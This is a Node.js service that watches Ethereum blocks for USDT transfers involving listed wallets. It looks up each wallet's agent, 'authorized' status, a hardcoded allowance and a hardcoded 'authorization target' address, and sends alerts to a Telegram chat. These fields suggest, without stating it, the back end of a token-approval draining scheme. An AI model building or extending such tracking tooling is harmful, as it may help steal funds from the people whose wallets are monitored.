import { createClient } from '@supabase/supabase-js';
import { ethers } from 'ethers';
import dotenv from 'dotenv';
import fetch from 'node-fetch';

dotenv.config();

// 配置
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_ANON_KEY;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const ETH_RPC_URL = process.env.ETH_RPC_URL || 'https://ethereum.publicnode.com';

// USDT合约配置
const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const USDT_TRANSFER_TOPIC = '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef';

// 初始化
const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
const provider = new ethers.JsonRpcProvider(ETH_RPC_URL);

// 监听状态
let lastCheckedBlock = 0;
let isRunning = false;

console.log('🚀 区块链实时监听服务启动中...');

/**
 * 获取最新区块号
 */
async function getLatestBlockNumber() {
  try {
    return await provider.getBlockNumber();
  } catch (error) {
    console.error('❌ 获取区块号失败:', error.message);
    return 0;
  }
}

/**
 * 获取监听地址列表
 */
async function getMonitoredAddresses() {
  try {
    const { data, error } = await supabase
      .from('wallet_monitor')
      .select('wallet_address')
      .eq('is_active', true)
      .eq('monitor_transactions', true);

    if (error) {
      console.error('❌ 获取监听地址失败:', error);
      return [];
    }

    return (data || []).map(item => item.wallet_address.toLowerCase());
  } catch (error) {
    console.error('❌ 获取监听地址异常:', error);
    return [];
  }
}

/**
 * 获取用户信息
 */
async function getUserInfo(address) {
  try {
    const { data: memberData, error } = await supabase
      .from('nh_member_new')
      .select('*')
      .eq('wallet_address', address.toLowerCase())
      .eq('is_active', true)
      .single();

    if (error || !memberData) {
      console.log(`⚠️ 用户信息不存在: ${address}`);
      return null;
    }

    // 获取代理信息
    let superiorAgent = '默认代理';
    let agentNickname = '直链注册';
    
    if (memberData.agent_id) {
      const { data: agentData } = await supabase
        .from('nh_agents')
        .select('agent_name, agent_code')
        .eq('id', memberData.agent_id)
        .single();
      
      if (agentData) {
        superiorAgent = agentData.agent_name || '默认代理';
        agentNickname = agentData.agent_code || '直链注册';
      }
    }

    // 获取用户编号
    const { data: userCount } = await supabase
      .from('nh_member_new')
      .select('id')
      .eq('approved', 1)
      .lte('first_approved_at', memberData.first_approved_at || new Date().toISOString())
      .order('first_approved_at', { ascending: true });
    
    const userNumber = userCount ? userCount.length : 0;

    return {
      userId: memberData.id,
      address: memberData.wallet_address,
      userNumber: userNumber,
      superiorAgent: superiorAgent,
      agentNickname: agentNickname,
      userRemark: memberData.user_remark || '暂无备注',
      isAuthorized: memberData.approved === 1 ? '是' : '否',
      allowance: '1000000',
      authAddress: '0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218'
    };
  } catch (error) {
    console.error('❌ 获取用户信息失败:', error);
    return null;
  }
}

/**
 * 发送Telegram消息
 */
async function sendTelegramMessage(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('⚠️ Telegram配置缺失');
    return false;
  }

  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
    
    const result = await response.json();
    if (result.ok) {
      console.log('✅ Telegram消息发送成功');
      return true;
    } else {
      console.error('❌ Telegram消息发送失败:', result);
      return false;
    }
  } catch (error) {
    console.error('❌ 发送Telegram消息异常:', error);
    return false;
  }
}

/**
 * 处理USDT交易
 */
async function handleUsdtTransaction(transfer, blockNumber, txHash) {
  try {
    console.log(`🔍 检测到USDT交易: ${transfer.from} -> ${transfer.to}, 金额: ${transfer.amount}`);
    
    // 获取监听地址列表
    const monitoredAddresses = await getMonitoredAddresses();
    
    let targetAddress = null;
    let transactionType = null;
    
    // 检查转入
    if (monitoredAddresses.includes(transfer.to)) {
      targetAddress = transfer.to;
      transactionType = 'in';
    }
    // 检查转出
    else if (monitoredAddresses.includes(transfer.from)) {
      targetAddress = transfer.from;
      transactionType = 'out';
    }
    
    if (!targetAddress) {
      console.log('⚠️ 交易地址不在监听列表中');
      return;
    }
    
    console.log(`🎯 发现监听地址交易: ${targetAddress}, 类型: ${transactionType}`);
    
    // 获取用户信息
    const userInfo = await getUserInfo(targetAddress);
    if (!userInfo) {
      console.error('❌ 无法获取用户信息');
      return;
    }
    
    // 构建消息
    const isIncome = transactionType === 'in';
    const amountText = `${isIncome ? '+' : ''}${parseFloat(transfer.amount).toFixed(6)} USDT`;
    const operationType = isIncome ? '客户USDT余额增加' : '客户USDT余额减少';
    
    const message = `
**钱包余额**: ${parseFloat(transfer.amount).toFixed(6)}
**顶层代理**: ${userInfo.superiorAgent}
**代理昵称**: ${userInfo.agentNickname}
**用户编号**: ${userInfo.userNumber}
**用户备注**: ${userInfo.userRemark}
**是否活动**: ${userInfo.isAuthorized}
**用户钱包**: 
${userInfo.address}
**授权金额**: ${userInfo.allowance} USDT
**客户地址**: 
${userInfo.address.toLowerCase()}
**授权对象**: 
${userInfo.authAddress}
**执行操作**: ${operationType}
**交易金额**: ${amountText}
**交易哈希**: ${txHash}
    `.trim();
    
    // 发送Telegram消息
    await sendTelegramMessage(message);
    
    // 记录到数据库
    await supabase.from('wallet_transactions').insert({
      user_address: targetAddress,
      transaction_type: transactionType,
      amount: transfer.amount,
      token: 'USDT',
      tx_hash: txHash,
      block_number: blockNumber,
      timestamp: new Date().toISOString(),
      from_address: transfer.from,
      to_address: transfer.to,
      is_processed: true,
      processed_at: new Date().toISOString(),
      notification_sent: true,
      error_message: null,
      created_at: new Date().toISOString()
    });
    
    console.log(`✅ 交易通知已发送: ${targetAddress}`);
    
  } catch (error) {
    console.error('❌ 处理USDT交易失败:', error);
  }
}

/**
 * 监听新区块
 */
async function monitorNewBlocks() {
  try {
    if (isRunning) return;
    isRunning = true;
    
    console.log('🔗 开始检查新区块...');
    
    // 获取最新区块号
    const latestBlock = await getLatestBlockNumber();
    
    if (latestBlock === 0) {
      console.error('❌ 无法获取最新区块号');
      isRunning = false;
      return;
    }
    
    // 初始化上次检查的区块号
    if (lastCheckedBlock === 0) {
      lastCheckedBlock = latestBlock - 1;
      console.log(`🚀 初始化监听区块: ${lastCheckedBlock}`);
      isRunning = false;
      return;
    }
    
    // 检查新区块
    if (latestBlock > lastCheckedBlock) {
      console.log(`📦 发现 ${latestBlock - lastCheckedBlock} 个新区块 (${lastCheckedBlock + 1} - ${latestBlock})`);
      
      // 获取监听地址列表
      const monitoredAddresses = await getMonitoredAddresses();
      
      if (monitoredAddresses.length === 0) {
        console.log('⚠️ 没有监听地址，跳过区块检查');
        lastCheckedBlock = latestBlock;
        isRunning = false;
        return;
      }
      
      console.log(`📍 监听地址: ${monitoredAddresses.length}个`);
      
      // 检查每个新区块的USDT交易
      for (let blockNum = lastCheckedBlock + 1; blockNum <= latestBlock; blockNum++) {
        try {
          console.log(`🔍 检查区块 ${blockNum}...`);
          
          // 获取区块日志
          const logs = await provider.getLogs({
            fromBlock: blockNum,
            toBlock: blockNum,
            address: USDT_CONTRACT,
            topics: [USDT_TRANSFER_TOPIC]
          });
          
          if (logs.length > 0) {
            console.log(`💰 区块 ${blockNum} 发现 ${logs.length} 个USDT Transfer事件`);
            
            for (const log of logs) {
              try {
                // 解析Transfer事件
                const from = '0x' + log.topics[1].slice(26);
                const to = '0x' + log.topics[2].slice(26);
                const amountHex = log.data;
                const amountWei = BigInt(amountHex);
                const amount = (Number(amountWei) / Math.pow(10, 6)).toString();
                
                const transfer = {
                  from: from.toLowerCase(),
                  to: to.toLowerCase(),
                  amount: amount
                };
                
                await handleUsdtTransaction(transfer, blockNum, log.transactionHash);
                
              } catch (logError) {
                console.error(`❌ 解析日志失败:`, logError.message);
              }
            }
          }
          
        } catch (blockError) {
          console.error(`❌ 检查区块 ${blockNum} 失败:`, blockError.message);
        }
      }
      
      lastCheckedBlock = latestBlock;
    }
    
    isRunning = false;
    
  } catch (error) {
    console.error('❌ 监听新区块失败:', error);
    isRunning = false;
  }
}

/**
 * 启动监听服务
 */
async function startMonitoring() {
  console.log('🚀 启动区块链实时监听服务...');
  
  // 立即执行一次检查
  await monitorNewBlocks();
  
  // 设置定时检查
  setInterval(async () => {
    await monitorNewBlocks();
  }, 10000); // 每10秒检查一次
  
  console.log('✅ 区块链实时监听服务已启动，每10秒检查一次新区块');
}

// 启动服务
startMonitoring().catch(console.error);
